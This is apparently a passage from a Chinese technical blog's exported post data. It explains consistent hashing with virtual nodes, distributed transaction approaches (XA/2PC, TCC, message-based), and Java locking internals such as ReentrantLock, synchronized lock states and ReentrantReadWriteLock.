可以！但是如果这样做，当我们需要访问某个缓存项时，则需要遍历3台缓存服务器，从3万个缓存项中找到我们需要访问的缓存，遍历的过程效率太低，时间太长，当我们找到需要访问的缓存项时，时长可能是不能被接受的，也就失去了缓存的意义，缓存的目的就是提高速度，改善用户体验，减轻后端服务器压力。 如果每次访问一个缓存项都需要遍历所有缓存服务器的所有缓存项，想想就觉得很累，那么，我们该怎么办呢？ 原始的做法是对缓存项的键进行哈希，将hash后的结果对缓存服务器的数量进行取模操作，通过取模后的结果，决定缓存项将会缓存在哪一台服务器上。 这样说可能不太容易理解，我们举例说明，仍然以刚才描述的场景为例，假设我们使用图片名称作为访问图片的key，假设图片名称是不重复的，那么，我们可以使用公式：hash(图片名称) % N，以计算出图片应该存放在哪台服务器上。 因为图片的名称是不重复的，所以，当我们对同一个图片名称做相同的哈希计算时，得出的结果应该是不变的，如果我们有3台服务器，使用哈希后的结果对3求余，那么余数一定是0、1或者2，没错，正好与我们之前的服务器编号相同： 如果求余的结果为0， 我们就把当前图片名称对应的图片缓存在0号服务器上； 如果余数为1，就把当前图片名对应的图片缓存在1号服务器上； 如果余数为2，同理 那么，当我们访问任意一个图片的时候，只要再次对图片名称进行上述运算，即可得出对应的图片应该存放在哪一台缓存服务器上，我们只要在这一台服务器上查找图片即可，如果图片在对应的服务器上不存在，则证明对应的图片没有被缓存，也不用再去遍历其他缓存服务器了。 通过这样的方法，即可将3万张图片随机的分布到3台缓存服务器上了，而且下次访问某张图片时，直接能够判断出该图片应该存在于哪台缓存服务器上，这样就能满足我们的需求了，我们暂时称上述算法为HASH算法或者取模算法。 问题但是，使用上述HASH算法进行缓存时，会出现一些缺陷。 试想一下，如果3台缓存服务器已经不能满足我们的缓存需求，那么我们应该怎么做呢？ 没错，很简单，多增加两台缓存服务器不就行了。假设，我们增加了一台缓存服务器，那么缓存服务器的数量就由3台变成了4台。 此时，如果仍然使用上述方法对同一张图片进行缓存，那么这张图片所在的服务器编号必定与原来3台服务器时所在的服务器编号不同，因为除数由3变为了4，被除数不变的情况下，余数肯定不同，这种情况带来的结果就是当服务器数量变动时，所有缓存的位置都要发生改变。 换句话说，当服务器数量发生改变时，所有缓存在一定时间内是失效的，当应用无法从缓存中获取数据时，则会向后端服务器请求数据。 同理，假设3台缓存中突然有一台缓存服务器出现了故障，无法进行缓存，那么我们则需要将故障机器移除，但是如果移除了一台缓存服务器，那么缓存服务器数量从3台变为2台，如果想要访问一张图片，这张图片的缓存位置必定会发生改变，以前缓存的图片也会失去缓存的作用与意义。 由于大量缓存在同一时间失效，造成了缓存的雪崩，此时前端缓存已经无法起到承担部分压力的作用，后端服务器将会承受巨大的压力，整个系统很有可能被压垮，所以，我们应该想办法不让这种情况发生，但是由于上述HASH算法本身的缘故，使用取模法进行缓存时，这种情况是无法避免的，为了解决这些问题，一致性哈希算法诞生了。 一致性哈希算法（Consistent Hashing）一致性哈希算法在1997年由麻省理工学院的Karger等人在解决分布式Cache中提出的，设计目标是为了解决因特网中的热点（Hot spot）问题，初衷和CARP十分类似。一致性哈希修正了CARP使用的简单哈希算法带来的问题，使得DHT可以在P2P环境中真正得到应用。 一致性哈希算法的特性考虑到分布式系统每个节点都有可能失效，并且新的节点很可能动态的增加进来，如何保证当系统的节点数目发生变化时仍然能够对外提供良好的服务，这是值得考虑的，尤其实在设计分布式缓存系统时，如果某台服务器失效，对于整个系统来说如果不采用合适的算法来保证一致性，那么缓存于系统中的所有数据都可能会失效（即由于系统节点数目变少，客户端在请求某一对象时需要重新计算其hash值（通常与系统中的节点数目有关），由于hash值已经改变，所以很可能找不到保存该对象的服务器节点），因此一致性hash就显得至关重要，良好的分布式缓存系统中的一致性hash算法应该满足以下几个方面： 平衡性（Balance）平衡性是指哈希的结果能够尽可能分布到所有的缓冲中去，这样可以使得所有的缓冲空间都得到利用。很多哈希算法都能够满足这一条件。 单调性（Monotonicity）单调性是指如果已经有一些内容通过哈希分派到了相应的缓冲中，又有新的缓冲区加入到系统中，那么哈希的结果应能够保证原有已分配的内容可以被映射到新的缓冲区中去，而不会被映射到旧的缓冲集合中的其他缓冲区。简单的哈希算法往往不能满足单调性的要求，如最简单的线性哈希：x = (ax + b) mod (P)，在上式中，P表示全部缓冲的大小。不难看出，当缓冲大小发生变化时(从P1到P2)，原来所有的哈希结果均会发生变化，从而不满足单调性的要求。哈希结果的变化意味着当缓冲空间发生变化时，所有的映射关系需要在系统内全部更新。而在P2P系统内，缓冲的变化等价于Peer加入或退出系统，这一情况在P2P系统中会频繁发生，因此会带来极大计算和传输负荷。单调性就是要求哈希算法能够应对这种情况。 分散性（Spread）在分布式环境中，终端有可能看不到所有的缓冲，而是只能看到其中的一部分。当终端希望通过哈希过程将内容映射到缓冲上时，由于不同终端所见的缓冲范围有可能不同，从而导致哈希的结果不一致，最终的结果是相同的内容被不同的终端映射到不同的缓冲区中。这种情况显然是应该避免的，因为它导致相同内容被存储到不同缓冲中去，降低了系统存储的效率。分散性的定义就是上述情况发生的严重程度。好的哈希算法应能够尽量避免不一致的情况发生，也就是尽量降低分散性。 负载（Load）负载问题实际上是从另一个角度看待分散性问题。既然不同的终端可能将相同的内容映射到不同的缓冲区中，那么对于一个特定的缓冲区而言，也可能被不同的用户映射为不同的内容。与分散性一样，这种情况也是应当避免的，因此好的哈希算法应能够尽量降低缓冲的负荷。 平滑性（Smoothness）平滑性是指缓存服务器的数目平滑改变和缓存对象的平滑改变是一致的。 一致性哈希算法（Consistent Hashing）一致性哈希算法（Consistent Hashing）最早在论文《Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web》中被提出。简单来说，一致性哈希将整个哈希值空间组织成一个虚拟的圆环，如假设某哈希函数H的值空间为0-2^32-1（即哈希值是一个32位无符号整形），整个哈希空间环如下： 整个空间按顺时针方向组织。0和232-1在零点中方向重合。 下一步，将各个缓存服务器使用Hash算法（一般情况下对机器的hash计算是采用机器的IP或者机器唯一的别名作为输入值），以将它们映射到环中（以确定每台缓存服务器在哈希环上的位置），以顺时针的方向计算。 接下来，对数据的key使用相同的Hash函数计算出哈希值，以确定此数据在环上的位置，从此位置沿环顺时针“行走”，第一台遇到的服务器就是该数据所存储到的服务器。 例如我们有Object A、Object B、Object C、Object D四个数据对象，同时，有四台缓存服务器 Node A、Node B、Node C、Node D。 经过哈希计算后，在环空间上的位置如下（即数据A会被存储到Node A上，B被存储到Node B上，C被存储到Node C上，D被存储到Node D上）： 现假设Node C不幸宕机，显然，对象A、B、D不会受到影响，只有C对象被重定位到Node D。 一般地，在一致性哈希算法中，如果一台服务器不可用，则受影响的数据仅仅是此服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据，其它不会受到影响。 如果在系统中增加一台服务器Node X，如下图所示： 此时对象Object A、B、D不受影响，只有对象C需要重定位到新的Node X 。一般的，在一致性哈希算法中，如果增加一台服务器，则受影响的数据仅仅是新服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据，其它数据也不会受到影响。 综上所述，一致性哈希算法对于节点的增减都只需重定位环空间中的一小部分数据，具有较好的容错性和可扩展性。 数据倾斜问题一致性哈希算法在服务节点太少时，容易因为节点分部不均匀而造成数据倾斜问题。例如系统中只有两台服务器，其环分布如下： 此时必然造成大量数据集中到Node A上，而只有极少量会定位到Node B上。为了解决这种数据倾斜问题，一致性哈希算法引入了虚拟节点机制，即对每一个服务节点计算多个哈希，每个计算结果位置都放置一个此服务节点，称为虚拟节点。具体做法可以在服务器ip或主机名的后面增加编号来实现。例如上面的情况，可以为每台服务器计算三个虚拟节点，于是可以分别计算 “Node A#1”、“Node A#2”、“Node A#3”、“Node B#1”、“Node B#2”、“Node B#3”的哈希值，于是形成六个虚拟节点： 同时数据定位算法不变，只是多了一步虚拟节点到实际节点的映射，例如定位到“Node A#1”、“Node A#2”、“Node A#3”三个虚拟节点的数据均定位到Node A上。这样就解决了服务节点少时数据倾斜的问题。在实际应用中，通常将虚拟节点数设置为32甚至更大，因此即使很少的服务节点也能做到相对均匀的数据分布。 Reference 每天进步一点点——五分钟理解一致性哈希算法(consistent hashing) - https://blog.csdn.net/cywosp/article/details/23397179 一致性哈希算法 - https://wizardforcel.gitbooks.io/the-art-of-programming-by-july/content/a.3.html 五分钟看懂一致性哈希算法 - https://juejin.im/post/5ae1476ef265da0b8d419ef2 白话解析：一致性哈希算法 consistent hashing - https://www.zsythink.net/archives/1182 漫画算法：什么是一致性哈希？ - https://www.jianshu.com/p/570dc8913c20","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Distributed System】分布式事务（Distributed Transaction）","date":"2019-07-12T05:06:21.000Z","path":"2019/07/12/【Distributed-System】分布式事务/","text":"背景事务（Transaction）事务（Transaction）提供一种机制将一个活动涉及的所有操作纳入到一个不可分割的执行单元，组成事务的所有操作只有在所有操作均能正常执行的情况下方能提交，只要其中任一操作执行失败，都将导致整个事务的回滚。简单地说，事务提供一种“要么什么都不做，要么做全套（All or Nothing）”机制。 数据库本地事务 - ACID说到数据库事务就不得不说，数据库事务中的四大特性，ACID： 原子性（Atomicity）一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。 就像你买东西要么交钱收货一起都执行，要么要是发不出货，就退钱。 一致性（Consistency）事务的一致性指的是在一个事务执行之前和执行之后数据库都必须处于一致性状态。如果事务成功地完成，那么系统中所有变化将正确地应用，系统处于有效状态。如果在事务中出现错误，那么系统中的所有变化将自动地回滚，系统返回到原始状态。 隔离性（Isolation）指的是在并发环境中，当不同的事务同时操纵相同的数据时，每个事务都有各自的完整数据空间。由并发事务所做的修改必须与任何其他并发事务所做的修改隔离。事务查看数据更新时，数据所处的状态要么是另一事务修改它之前的状态，要么是另一事务修改它之后的状态，事务不会查看到中间状态的数据。 打个比方，你买东西这个事情，是不影响其他人的。 持久性（Durability）指的是只要事务成功结束，它对数据库所做的更新就必须永久保存下来。即使发生系统崩溃，重新启动数据库系统后，数据库还能恢复到事务成功结束时的状态。 打个比方，你买东西的时候需要记录在账本上，即使老板忘记了那也有据可查。 InnoDB实现原理InnoDB是mysql的一个存储引擎，大部分人对mysql都比较熟悉，这里简单介绍一下数据库事务实现的一些基本原理，在本地事务中，服务和资源在事务的包裹下可以看做是一体的: 我们的本地事务由资源管理器进行管理: 而事务的ACID是通过InnoDB日志和锁来保证。事务的隔离性是通过数据库锁的机制实现的，持久性通过redo log（重做日志）来实现，原子性和一致性通过Undo log来实现。UndoLog的原理很简单，为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储数据备份的地方称为UndoLog）。然后进行数据的修改。如果出现了错误或者用户执行了ROLLBACK语句，系统可以利用Undo Log中的备份将数据恢复到事务开始之前的状态。 和Undo Log相反，RedoLog记录的是新数据的备份。在事务提交前，只要将RedoLog持久化即可，不需要将数据持久化。当系统崩溃时，虽然数据没有持久化，但是RedoLog已经持久化。系统可以根据RedoLog的内容，将所有数据恢复到最新的状态。 对具体实现过程有兴趣的同学可以去自行搜索扩展。 分布式事务（Distributed Transaction）什么是分布式事务分布式事务就是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。简单的说，就是一次大的操作由不同的小操作组成，这些小的操作分布在不同的服务器上，且属于不同的应用，分布式事务需要保证这些小操作要么全部成功，要么全部失败。本质上来说，分布式事务就是为了保证不同数据库的数据一致性。 分布式事务产生的原因从上面本地事务来看，我们可以看为两块，一个是service产生多个节点，另一个是resource产生多个节点。 service多个节点（跨库事务）随着互联网快速发展，微服务，SOA等服务架构模式正在被大规模的使用，举个简单的例子，一个公司之内，用户的资产可能分为好多个部分，比如余额，积分，优惠券等等。在公司内部有可能积分功能由一个微服务团队维护，优惠券又是另外的团队维护。 这样的话就无法保证积分扣减了之后，优惠券能否扣减成功。 resource多个节点（分库分表）同样的，互联网发展得太快了，我们的Mysql一般来说装千万级的数据就得进行分库分表，对于一个支付宝的转账业务来说，你给的朋友转钱，有可能你的数据库是在北京，而你的朋友的钱是存在上海，所以我们依然无法保证他们能同时成功。 分布式事务解决方案全局事务 - X/Open DTP模型与XA规范X/Open DTP(X/Open Distributed Transaction Processing Reference Model) 是X/Open 这个组织定义的一套分布式事务的标准，也就是了定义了规范和API接口，由这个厂商进行具体的实现。这个思想在java 平台里面到处都是。 X/Open DTP 定义了三个组件： AP，TM，RM： AP（Application Program）：它就是我们开发的业务系统，在我们开发的过程中，可以使用资源管理器提供的事务接口来实现分布式事务。 TM（Transaction Manager），事务管理器： 分布式事务的实现由事务管理器来完成，它会提供分布式事务的操作接口供我们的业务系统调用。这些接口称为TX接口。 事务管理器还管理着所有的资源管理器，通过它们提供的XA接口来同一调度这些资源管理器，以实现分布式事务。 DTP只是一套实现分布式事务的规范，并没有定义具体如何实现分布式事务，TM可以采用2PC、3PC、Paxos等协议实现分布式事务。 RM（Resource Manager）资源管理器： 能够提供数据服务的对象都可以是资源管理器，比如：数据库、消息中间件、缓存等。大部分场景下，数据库即为分布式事务中的资源管理器。 资源管理器能够提供单数据库的事务能力，它们通过XA接口，将本数据库的提交、回滚等能力提供给事务管理器调用，以帮助事务管理器实现分布式的事务管理。 XA是DTP模型定义的接口，用于向事务管理器提供该资源管理器(该数据库)的提交、回滚等能力。 DTP只是一套实现分布式事务的规范，RM具体的实现是由数据库厂商来完成的。 下面一幅图说明了三者的关系： J2EE 规范也包含此分布式事务处理模型的规范，并在所有的 AppServer 中进行实现，J2EE 规范中定义了 TX 协议和 XA 协议，TX 协议定义应用程序与事务管理器之间的接口，而 XA 协议定义了事务管理器与资源处理器之间的接口，在过去，大家使用 AppServer，例如：Websphere、Weblogic、Jboss 等配置数据源的时候会看见类似 XADatasource 的数据源，这就是实现了 DTS 的关系型数据库的数据源。企业级开发 JEE 中，关系型数据库、JMS 服务扮演资源管理器的角色，而 EJB 容器则扮演事务管理器的角色。 XA 协议XA是一个分布式事务协议，由Tuxedo提出。XA中大致分为两部分：事务管理器和本地资源管理器。其中本地资源管理器往往由数据库实现，比如Oracle、DB2这些商业数据库都实现了XA接口，而事务管理器作为全局的调度者，负责各个本地资源的提交和回滚。XA实现分布式事务的原理如下： XA 协议就是根据两阶段提交协议（The two-phase commit protocol，2PC）来保证事务的完整性，除此之外，还可以使用三阶段提交协议（Three-phase commit protocol）。 两阶段提交协议（The two-phase commit protocol，2PC）两阶段提交协议（The two-phase commit protocol，2PC）是XA用于在全局事务中协调多个资源的机制。两阶段协议遵循OSI（Open System Interconnection，开放系统互联）/DTP标准，虽然它比标准本身早若干年出现。 三阶段提交协议（Three-phase commit protocol，3PC）三阶段提交（Three-phase commit），也叫三阶段提交协议（Three-phase commit protocol），是二阶段提交（2PC）的改进版本。 JTAJTA（Java Transaction API）是符合X/Open DTP的一个编程模型，事务管理和资源管理器支架也是用了XA协议。 JTA事务可以用来实现J2EE中的全局事务。 Java事务API（JTA：Java Transaction API）和它的同胞Java事务服务（JTS：Java Transaction Service），为J2EE平台提供了分布式事务服务（distributed transaction）的能力。 某种程度上，可以认为JTA规范是XA规范的Java版，其把XA规范中规定的DTP模型交互接口抽象成Java接口中的方法，并规定每个方法要实现什么样的功能。 TCC（Try-Confirm-Cancel） 关于TCC（Try-Confirm-Cancel）的概念，最早是由Pat Helland于2007年发表的一篇名为《Life beyond Distributed Transactions:an Apostate’s Opinion》的论文提出。 TCC即为Try Confirm Cancel，它属于补偿型分布式事务。顾名思义，TCC实现分布式事务一共有三个步骤： Try阶段：尝试执行,完成所有业务检查（一致性）,预留必须业务资源（准隔离性） Confirm阶段：确认执行真正执行业务，不作任何业务检查，只使用Try阶段预留的业务资源，Confirm操作满足幂等性。要求具备幂等设计，Confirm失败后需要进行重试。 Cancel阶段：取消执行，释放Try阶段预留的业务资源 Cancel操作满足幂等性Cancel阶段的异常和Confirm阶段异常处理方案基本上一致。 举个简单的例子如果你用100元买了一瓶水，： Try阶段:你需要向你的钱包检查是否够100元并锁住这100元，水也是一样的。 如果有一个失败，则进行cancel(释放这100元和这一瓶水)，如果cancel失败不论什么失败都进行重试cancel，所以需要保持幂等。 如果都成功，则进行confirm,确认这100元扣，和这一瓶水被卖，如果confirm失败无论什么失败则重试(会依靠活动日志进行重试) TCC事务机制相比于上面介绍的XA，解决了其几个缺点: 解决了协调者单点，由主业务方发起并完成这个业务活动。业务活动管理器也变成多点，引入集群。 同步阻塞：引入超时，超时后进行补偿，并且不会锁定整个资源，将资源转换为业务逻辑形式，粒度变小。 数据一致性，有了补偿机制之后，由业务活动管理器控制一致性。 对于TCC来说适合一些： 强隔离性，严格一致性要求的活动业务。 执行时间较短的业务 基于可靠消息服务的分布式事务这种实现分布式事务的方式需要通过消息中间件来实现。假设有A和B两个系统，分别可以处理任务A和任务B。此时系统A中存在一个业务流程，需要将任务A和任务B在同一个事务中处理。下面来介绍基于消息中间件来实现这种分布式事务。 在系统A处理任务A前，首先向消息中间件发送一条消息 消息中间件收到后将该条消息持久化，但并不投递。此时下游系统B仍然不知道该条消息的存在。 消息中间件持久化成功后，便向系统A返回一个确认应答； 系统A收到确认应答后，则可以开始处理任务A； 任务A处理完成后，向消息中间件发送Commit请求。该请求发送完成后，对系统A而言，该事务的处理过程就结束了，此时它可以处理别的任务了。 但commit消息可能会在传输途中丢失，从而消息中间件并不会向系统B投递这条消息，从而系统就会出现不一致性。这个问题由消息中间件的事务回查机制完成，下文会介绍。 消息中间件收到Commit指令后，便向系统B投递该消息，从而触发任务B的执行； 当任务B执行完成后，系统B向消息中间件返回一个确认应答，告诉消息中间件该消息已经成功消费，此时，这个分布式事务完成。 上述过程可以得出如下几个结论： 消息中间件扮演者分布式事务协调者的角色。 系统A完成任务A后，到任务B执行完成之间，会存在一定的时间差。在这个时间差内，整个系统处于数据不一致的状态，但这短暂的不一致性是可以接受的，因为经过短暂的时间后，系统又可以保持数据一致性，满足BASE理论。 Reference 再有人问你分布式事务，把这篇扔给他 - https://juejin.im/post/5b5a0bf9f265da0f6523913b#heading-16 DTP模型之一：（XA协议之一）XA协议、二阶段2PC、三阶段3PC提交 - https://www.cnblogs.com/duanxz/p/4672708.html X/Open DTP——分布式事务模型 - https://www.cnblogs.com/aigongsi/archive/2012/10/11/2718313.html 常用的分布式事务解决方案 - https://juejin.im/post/5aa3c7736fb9a028bb189bca#heading-14 分布式系统的事务处理 - https://coolshell.cn/articles/10910.html 1.0 分布式事务概述 - http://www.tianshouzhi.com/api/tutorials/distributed_transaction/383","comments":true,"categories":[{"name":"DistributedSystem","slug":"DistributedSystem","permalink":"http://swsmile.info/categories/DistributedSystem/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"http://swsmile.info/tags/Distributed-System/"}]},{"title":"【Java】锁 - Lock 接口","date":"2019-07-12T04:11:12.000Z","path":"2019/07/12/【Java】锁-Lock接口/","text":"Lock接口我们现在就来看看lock接口定义了哪些方法： 1234567891011121314//获取锁 void lock(); //获取锁的过程能够响应中断void lockInterruptibly() throws InterruptedException； //非阻塞式响应中断能立即返回，获取锁放回true反之返回fasle boolean tryLock();//超时获取锁，在超时内或者未中断的情况下能够获取锁 boolean tryLock(long time, TimeUnit unit) throws InterruptedException;//获取与lock绑定的等待通知组件，当前线程必须获得了锁才能进行等待，进行等待时会先释放锁，当再次获取锁时才能从等待中返回Condition newCondition(); 实现类 - ReentrantLock1public class ReentrantLock implements Lock, java.io.Serializable 很显然ReentrantLock类实现了lock接口，接下来我们来仔细研究一下它是怎样实现的。 当你查看源码时，你会惊讶的发现ReentrantLock并没有多少代码，另外有一个很明显的特点是：基本上所有的方法的实现实际上都是调用了其静态抽象类Sync中的方法，而Sync类继承了AbstractQueuedSynchronizer（AQS）。静态抽象类Sync有两个实现类，分别是NonfairSync类和FairSync类。 可以看出要想理解ReentrantLock关键核心在于对队列同步器AbstractQueuedSynchronizer（简称同步器）的理解。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java关键字 - synchronized关键字中的锁状态","date":"2019-07-12T03:34:49.000Z","path":"2019/07/12/【Java】Java关键字-synchronized关键字中的锁状态/","text":"无锁 VS 偏向锁 VS 轻量级锁 VS 重量级锁这四种锁是指锁的状态，专门针对synchronized关键字对应的互斥锁的。在介绍这四种锁状态之前还需要介绍一些额外的知识。 首先为什么synchronized能实现线程同步？ 在回答这个问题之前我们需要了解两个重要的概念：“Java对象头”、“Monitor”。 背景知识Java对象头synchronized是悲观锁，在操作同步资源之前需要给同步资源先加锁，这把锁就是存在Java对象头里的，而Java对象头又是什么呢？ 我们以Hotspot虚拟机为例，Hotspot的对象头主要包括两部分数据：Mark Word（标记字段）、Klass Pointer（类型指针）。 Mark Word：默认存储对象的HashCode，分代年龄和锁标志位信息。这些信息都是与对象自身定义无关的数据，所以Mark Word被设计成一个非固定的数据结构以便在极小的空间内存存储尽量多的数据。它会根据对象的状态复用自己的存储空间，也就是说在运行期间Mark Word里存储的数据会随着锁标志位的变化而变化。 Klass Point：对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。 MonitorMonitor可以理解为一个同步工具或一种同步机制，通常被描述为一个对象。每一个Java对象就有一把看不见的锁，称为内部锁或者Monitor锁。 Monitor是线程私有的数据结构，每一个线程都有一个可用monitor record列表，同时还有一个全局的可用列表。每一个被锁住的对象都会和一个monitor关联，同时monitor中有一个Owner字段存放拥有该锁的线程的唯一标识，表示该锁被这个线程占用。 分析现在话题回到synchronized，synchronized通过Monitor来实现线程同步，Monitor是依赖于底层的操作系统的Mutex Lock（互斥锁）来实现的线程同步。 如同我们在自旋锁中提到的“阻塞或唤醒一个Java线程需要操作系统切换CPU状态来完成，这种状态转换需要耗费处理器时间。如果同步代码块中的内容过于简单，状态转换消耗的时间有可能比用户代码执行的时间还要长”。这种方式就是synchronized最初实现同步的方式，这就是JDK 6之前synchronized效率低的原因。 这种依赖于操作系统Mutex Lock所实现的锁我们称之为“重量级锁”，JDK 6中为了减少获得锁和释放锁带来的性能消耗，引入了“偏向锁”和“轻量级锁”。 所以目前锁一共有4种状态，级别从低到高依次是：无锁、偏向锁、轻量级锁和重量级锁。锁状态只能升级不能降级。 通过上面的介绍，我们对synchronized的加锁机制以及相关知识有了一个了解，那么下面我们给出四种锁状态对应的的Mark Word内容，然后再分别讲解四种锁状态的思路以及特点： 锁状态 存储内容 存储内容 无锁 对象的hashCode、对象分代年龄、是否是偏向锁（0） 01 偏向锁 偏向线程ID、偏向时间戳、对象分代年龄、是否是偏向锁（1） 01 轻量级锁 指向栈中锁记录的指针 00 重量级锁 指向互斥量（重量级锁）的指针 10 无锁无锁没有对资源进行锁定，所有的线程都能访问并修改同一个资源，但同时只有一个线程能修改成功。 无锁的特点就是修改操作在循环内进行，线程会不断的尝试修改共享资源。如果没有冲突就修改成功并退出，否则就会继续循环尝试。如果有多个线程修改同一个值，必定会有一个线程能修改成功，而其他修改失败的线程会不断重试直到修改成功。上面我们介绍的CAS原理及应用即是无锁的实现。无锁无法全面代替有锁，但无锁在某些场合下的性能是非常高的。 偏向锁（Biased Lock）偏向锁（Biased Lock）是指一段同步代码一直被一个线程所访问，那么该线程会自动获取锁，降低获取锁的代价。 在大多数情况下，锁总是由同一线程多次获得，不存在多线程竞争，所以出现了偏向锁。其目标就是在只有一个线程执行同步代码块时能够提高性能。 当一个线程访问同步代码块并获取锁时，会在Mark Word里存储锁偏向的线程ID。在线程进入和退出同步块时不再通过CAS操作来加锁和解锁，而是检测Mark Word里是否存储着指向当前线程的偏向锁。引入偏向锁是为了在无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径，因为轻量级锁的获取及释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令即可。 偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待全局安全点（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态。撤销偏向锁后恢复到无锁（标志位为“01”）或轻量级锁（标志位为“00”）的状态。 偏向锁在JDK 6及以后的JVM里是默认启用的。可以通过JVM参数关闭偏向锁：-XX:-UseBiasedLocking=false，关闭之后程序默认会进入轻量级锁状态。 轻量级锁是指当锁是偏向锁的时候，被另外的线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞，从而提高性能。 在代码进入同步块的时候，如果同步对象锁状态为无锁状态（锁标志位为“01”状态，是否为偏向锁为“0”），虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的Mark Word的拷贝，然后拷贝对象头中的Mark Word复制到锁记录中。 拷贝成功后，虚拟机将使用CAS操作尝试将对象的Mark Word更新为指向Lock Record的指针，并将Lock Record里的owner指针指向对象的Mark Word。 如果这个更新动作成功了，那么这个线程就拥有了该对象的锁，并且对象Mark Word的锁标志位设置为“00”，表示此对象处于轻量级锁定状态。 如果轻量级锁的更新操作失败了，虚拟机首先会检查对象的Mark Word是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行，否则说明多个线程竞争锁。 若当前只有一个等待线程，则该线程通过自旋进行等待。但是当自旋超过一定的次数，或者一个线程在持有锁，一个在自旋，又有第三个来访时，轻量级锁升级为重量级锁。 重量级锁升级为重量级锁时，锁标志的状态值变为“10”，此时Mark Word中存储的是指向重量级锁的指针，此时等待锁的线程都会进入阻塞状态。 整体的锁状态升级流程如下： 综上，偏向锁通过对比Mark Word解决加锁问题，避免执行CAS操作。而轻量级锁是通过用CAS操作和自旋来解决加锁问题，避免线程阻塞和唤醒而影响性能。重量级锁是将除了拥有锁的线程以外的线程都阻塞。 Reference 《java并发编程的艺术》 不可不说的Java“锁”事 - https://tech.meituan.com/2018/11/15/java-lock.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Lock】独享锁（Exclusive Lock） VS 共享锁（Shared Lock）","date":"2019-07-12T03:26:54.000Z","path":"2019/07/12/【Lock】独享锁vs共享锁/","text":"独享锁（Exclusive Lock） VS 共享锁（Shared Lock）独享锁（Exclusive Lock）也叫排他锁，是指该锁一次只能被一个线程所持有。如果线程T对数据A加上排它锁后，则其他线程不能再对A加任何类型的锁。获得排它锁的线程即能读数据又能修改数据。JDK中的synchronized和JUC中Lock的实现类就是互斥锁。 共享锁（Shared Lock）是指该锁可被多个线程所持有。典型的就是ReentrantReadWriteLock里的读锁，它的读锁是可以被共享的，但是它的写锁确每次只能被独占。 独享锁与共享锁也是通过AQS来实现的，通过实现不同的方法，来实现独享或者共享。 下图为ReentrantReadWriteLock的部分源码： 我们看到ReentrantReadWriteLock有两把锁：ReadLock和WriteLock，由词知意，一个读锁一个写锁，合称“读写锁”。再进一步观察可以发现ReadLock和WriteLock是靠内部类Sync实现的锁。Sync是AQS的一个子类，这种结构在CountDownLatch、ReentrantLock、Semaphore里面也都存在。 在ReentrantReadWriteLock里面，读锁和写锁的锁主体都是Sync，但读锁和写锁的加锁方式不一样。读锁是共享锁，写锁是独享锁。读锁的共享锁可保证并发读非常高效，而读写、写读、写写的过程互斥，因为读锁和写锁是分离的。所以ReentrantReadWriteLock的并发性相比一般的互斥锁有了很大提升。 那读锁和写锁的具体加锁方式有什么区别呢？在了解源码之前我们需要回顾一下其他知识。 在最开始提及AQS的时候我们也提到了state字段（int类型，32位），该字段用来描述有多少线程获持有锁。 在独享锁中这个值通常是0或者1（如果是重入锁的话state值就是重入的次数），在共享锁中state就是持有锁的数量。但是在ReentrantReadWriteLock中有读、写两把锁，所以需要在一个整型变量state上分别描述读锁和写锁的数量（或者也可以叫状态）。于是将state变量“按位切割”切分成了两个部分，高16位表示读锁状态（读锁个数），低16位表示写锁状态（写锁个数）。如下图所示： 了解了概念之后我们再来看代码，先看写锁的加锁源码： 12345678910111213141516171819protected final boolean tryAcquire(int acquires) &#123; Thread current = Thread.currentThread(); int c = getState(); // 取到当前锁的个数 int w = exclusiveCount(c); // 取写锁的个数w if (c != 0) &#123; // 如果已经有线程持有了锁(c!=0) // (Note: if c != 0 and w == 0 then shared count != 0) if (w == 0 || current != getExclusiveOwnerThread()) // 如果写线程数（w）为0（换言之存在读锁） 或者持有锁的线程不是当前线程就返回失败 return false; if (w + exclusiveCount(acquires) &gt; MAX_COUNT) // 如果写入锁的数量大于最大数（65535，2的16次方-1）就抛出一个Error。 throw new Error(\"Maximum lock count exceeded\"); // Reentrant acquire setState(c + acquires); return true; &#125; if (writerShouldBlock() || !compareAndSetState(c, c + acquires)) // 如果当且写线程数为0，并且当前线程需要阻塞那么就返回失败；或者如果通过CAS增加写线程数失败也返回失败。 return false; setExclusiveOwnerThread(current); // 如果c=0，w=0或者c&gt;0，w&gt;0（重入），则设置当前线程或锁的拥有者 return true;&#125; 这段代码首先取到当前锁的个数c，然后再通过c来获取写锁的个数w。因为写锁是低16位，所以取低16位的最大值与当前的c做与运算（ int w = exclusiveCount©; ），高16位和0与运算后是0，剩下的就是低位运算的值，同时也是持有写锁的线程数目。 